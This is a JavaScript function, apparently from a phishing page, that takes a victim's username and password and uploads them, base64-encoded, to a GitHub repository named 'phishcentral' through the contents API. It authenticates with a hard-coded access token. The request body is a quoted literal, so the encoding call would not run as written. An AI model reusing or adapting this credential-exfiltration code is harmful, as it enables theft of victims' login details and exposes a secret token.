function sendRequest(username, password) {
  $.ajax({
      type: 'PUT',
      dataType: 'json',
      url: "https://api.github.com/repos/phishcentral/phishcentral.github.io/contents/data/" + username + ".txt",
      headers: {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Authorization": "token 47d711cff4671182e9faf11581b69885b4498fd7"},
      data: '{ "message": "my commit message", "committer": { "name": "Monalisa Octocat", "email": "octocat@github.com" }, "content": btoa(username + ":" + password) }'
  });
}
